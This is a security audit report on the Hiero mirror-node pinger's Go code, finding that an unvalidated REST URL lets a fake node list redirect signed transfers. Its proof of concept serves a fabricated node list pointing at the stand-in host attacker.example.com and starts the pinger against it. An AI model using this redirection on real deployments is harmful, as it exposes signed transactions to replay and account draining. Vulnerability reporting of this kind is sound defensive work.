All six code references in the claim are accurate. Let me verify each one against the actual source.

- `config.go:37` — `HIERO_MIRROR_PINGER_REST` is read with no URL validation. [1](#0-0) 
- `config.go:133–135` — only an emptiness check guards the value. [2](#0-1) 
- `sdk_client.go:17–22` — `buildNetworkFromMirrorNodes` is called with the unvalidated URL and its result passed directly to `hiero.ClientForNetwork`. [3](#0-2) 
- `mirror_node_client.go:36–44` — the URL is used verbatim to construct the HTTP request. [4](#0-3) 
- `mirror_node_client.go:100–124` — JSON response endpoints are inserted into the network map with no integrity check. [5](#0-4) 
- `transfer.go:33` — every periodic transfer executes against this client. [6](#0-5) 

None of the SECURITY.md exclusions apply: the attack does not require leaked keys/credentials, physical access, or network-level access to Hiero nodes — only control of one environment variable. [7](#0-6) 

---

# Audit Report

## Title
Unvalidated `HIERO_MIRROR_PINGER_REST` URL Enables Full Transaction Routing Hijack via Poisoned Node List

## Summary
When `HIERO_MIRROR_PINGER_NETWORK=other`, the `HIERO_MIRROR_PINGER_REST` environment variable is accepted without any URL validation and used verbatim to fetch the gRPC node list. An attacker who controls this variable can point it at an attacker-controlled HTTP server that returns a fabricated node list, causing every `cryptoTransfer.Execute()` call to send fully-signed transactions to attacker-controlled gRPC infrastructure.

## Finding Description

**Code path:**

1. `pinger/config.go:37` — `HIERO_MIRROR_PINGER_REST` is read from the environment with no validation beyond a non-empty check: [1](#0-0) 

2. `pinger/config.go:133–135` — the only guard is an emptiness check; no scheme enforcement, no hostname allowlist, no TLS requirement: [2](#0-1) 

3. `pinger/sdk_client.go:17–22` — when `network == "other"`, `buildNetworkFromMirrorNodes` is called with the unvalidated URL and its result is passed directly to `hiero.ClientForNetwork`: [3](#0-2) 

4. `pinger/mirror_node_client.go:36–44` — the attacker-supplied base URL is used verbatim to construct the HTTP request URL: [4](#0-3) 

5. `pinger/mirror_node_client.go:100–124` — the JSON response from the attacker's server is parsed and its `service_endpoints` (host + port) are inserted directly into the network map with no integrity check: [5](#0-4) 

6. `pinger/transfer.go:33` — every periodic transfer executes against this poisoned client: [6](#0-5) 

**Root cause:** The code assumes `mirrorRest` is a trusted, operator-controlled endpoint. There is no URL scheme enforcement (plain `http://` is the documented example), no TLS certificate pinning, no hostname allowlist, and no cryptographic verification of the returned node list. The node list is the sole source of truth for which gRPC endpoints receive signed transactions.

## Impact Explanation

- **Transaction interception:** Every `cryptoTransfer` is serialized, signed with the operator private key, and sent as a gRPC call to the attacker's server. The attacker receives complete, valid, signed transaction bytes.
- **Replay on real network:** The attacker can forward or replay those signed transactions against the real Hiero network at will, draining the operator account.
- **Health-monitor blind spot:** The pinger is a liveness/readiness probe for the mirror node. Routing it to a fake network silently breaks the monitoring signal without triggering any alert.
- **Severity: High** — confidentiality of signed transaction content and integrity of fund transfers are both compromised.

## Likelihood Explanation

The precondition — controlling one environment variable — is realistic in several common scenarios: misconfigured Kubernetes `ConfigMap`/`Secret` with overly broad RBAC, a compromised CI/CD pipeline that injects env vars into the container spec, or a shared-namespace container escape. The attacker does not need network-level access to the Hiero nodes themselves; they only need to serve a valid JSON response on an HTTP port. The attack is repeatable on every pinger restart and on every periodic tick.

## Recommendation

1. **Enforce HTTPS scheme:** Reject any `mirrorRest` value whose URL scheme is not `https`. Add a `url.Parse` check in `loadConfig()` after line 135 in `pinger/config.go`.
2. **Hostname allowlist:** Validate the hostname of `mirrorRest` against a configurable allowlist of trusted mirror node domains.
3. **TLS certificate verification:** Ensure the `http.Client` in `mirror_node_client.go` uses the default TLS configuration (no `InsecureSkipVerify`) and consider certificate pinning for production deployments.
4. **Node list integrity:** Cross-check the returned node account IDs against a known-good set (e.g., the well-known Hiero address book) before building the network map.

## Proof of Concept

```
# 1. Start a malicious HTTP server returning a fabricated node list
cat > fake_nodes.json <<'EOF'
{
  "nodes": [{
    "node_account_id": "0.0.3",
    "service_endpoints": [{"domain_name": "attacker.example.com", "port": 50211}]
  }],
  "links": {}
}
EOF
python3 -m http.server 8888  # serves fake_nodes.json at /api/v1/network/nodes

# 2. Launch the pinger pointing at the attacker's server
HIERO_MIRROR_PINGER_NETWORK=other \
HIERO_MIRROR_PINGER_REST=http://attacker.example.com:8888 \
HIERO_MIRROR_PINGER_OPERATOR_KEY=<real_key> \
HIERO_MIRROR_PINGER_OPERATOR_ID=<real_id> \
./pinger

# 3. The pinger builds its client from the fabricated node list (mirror_node_client.go:100-124),
#    then every cryptoTransfer.Execute(client) (transfer.go:33) sends a fully-signed
#    transaction to attacker.example.com:50211 instead of the real Hiero network.
#    The attacker's gRPC server captures the signed transaction bytes and can replay
#    them against the real network.
```

### Citations

**File:** pinger/config.go (L37-37)
```go
	flag.StringVar(&cfg.mirrorRest, "mirror-rest", envOr("HIERO_MIRROR_PINGER_REST", ""), "mirror node REST base URL (required for other), e.g. http://mirror-rest:5551")
```

**File:** pinger/config.go (L133-135)
```go
	if cfg.network == "other" && strings.TrimSpace(cfg.mirrorRest) == "" {
		return cfg, fmt.Errorf("HIERO_MIRROR_PINGER_NETWORK=other requires HIERO_MIRROR_PINGER_REST")
	}
```

**File:** pinger/sdk_client.go (L17-22)
```go
	case "other":
		netmap, err := buildNetworkFromMirrorNodes(context.Background(), cfg)
		if err != nil {
			return nil, err
		}
		client = hiero.ClientForNetwork(netmap)
```

**File:** pinger/mirror_node_client.go (L36-44)
```go
func buildNetworkFromMirrorNodes(ctx context.Context, cfg config) (map[string]hiero.AccountID, error) {
	base := strings.TrimRight(strings.TrimSpace(cfg.mirrorRest), "/")

	var url string
	if strings.HasSuffix(base, "/api/v1") {
		url = base + "/network/nodes"
	} else {
		url = base + "/api/v1/network/nodes"
	}
```

**File:** pinger/mirror_node_client.go (L100-124)
```go
	network := make(map[string]hiero.AccountID)

	for _, n := range payload.Nodes {
		if n.NodeAccountID == "" {
			continue
		}

		nodeAccountId, err := hiero.AccountIDFromString(n.NodeAccountID)
		if err != nil {
			continue
		}

		// Use service_endpoints for node gRPC (what the SDK wants)
		for _, ep := range n.ServiceEndpoints {
			host := strings.TrimSpace(ep.DomainName)
			if host == "" {
				host = strings.TrimSpace(ep.IPAddressV4)
			}
			if host == "" || ep.Port == 0 {
				continue
			}

			addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
			network[addr] = nodeAccountId
		}
```

**File:** pinger/transfer.go (L33-33)
```go
		resp, err := cryptoTransfer.Execute(client)
```

**File:** SECURITY.md (L1-55)
```markdown
# Common Vulnerability Exclusion List

## Out of Scope & Rules

These are the default impacts recommended to projects to mark as out of scope for their bug bounty program. The actual list of out-of-scope impacts differs from program to program.

### General

- Impacts requiring attacks that the reporter has already exploited themselves, leading to damage.
- Impacts caused by attacks requiring access to leaked keys/credentials.
- Impacts caused by attacks requiring access to privileged addresses (governance, strategist), except in cases where the contracts are intended to have no privileged access to functions that make the attack possible.
- Impacts relying on attacks involving the depegging of an external stablecoin where the attacker does not directly cause the depegging due to a bug in code.
- Mentions of secrets, access tokens, API keys, private keys, etc. in GitHub will be considered out of scope without proof that they are in use in production.
- Best practice recommendations.
- Feature requests.
- Impacts on test files and configuration files, unless stated otherwise in the bug bounty program.

### Smart Contracts / Blockchain DLT

- Incorrect data supplied by third-party oracles.
- Impacts requiring basic economic and governance attacks (e.g. 51% attack).
- Lack of liquidity impacts.
- Impacts from Sybil attacks.
- Impacts involving centralization risks.

Note: This does not exclude oracle manipulation/flash-loan attacks.

### Websites and Apps

- Theoretical impacts without any proof or demonstration.
- Impacts involving attacks requiring physical access to the victim device.
- Impacts involving attacks requiring access to the local network of the victim.
- Reflected plain text injection (e.g. URL parameters, path, etc.).
- This does not exclude reflected HTML injection with or without JavaScript.
- This does not exclude persistent plain text injection.
- Any impacts involving self-XSS.
- Captcha bypass using OCR without impact demonstration.
- CSRF with no state-modifying security impact (e.g. logout CSRF).
- Impacts related to missing HTTP security headers (such as `X-FRAME-OPTIONS`) or cookie security flags (such as `httponly`) without demonstration of impact.
- Server-side non-confidential information disclosure, such as IPs, server names, and most stack traces.
- Impacts causing only the enumeration or confirmation of the existence of users or tenants.
- Impacts caused by vulnerabilities requiring unprompted, in-app user actions that are not part of the normal app workflows.
- Lack of SSL/TLS best practices.
- Impacts that only require DDoS.
- UX and UI impacts that do not materially disrupt use of the platform.
- Impacts primarily caused by browser/plugin defects.
- Leakage of non-sensitive API keys (e.g. Etherscan, Infura, Alchemy, etc.).
- Any vulnerability exploit requiring browser bugs for exploitation (e.g. CSP bypass).
- SPF/DMARC misconfigured records.
- Missing HTTP headers without demonstrated impact.
- Automated scanner reports without demonstrated impact.
- UI/UX best practice recommendations.
- Non-future-proof NFT rendering.

## Prohibited Activities
```
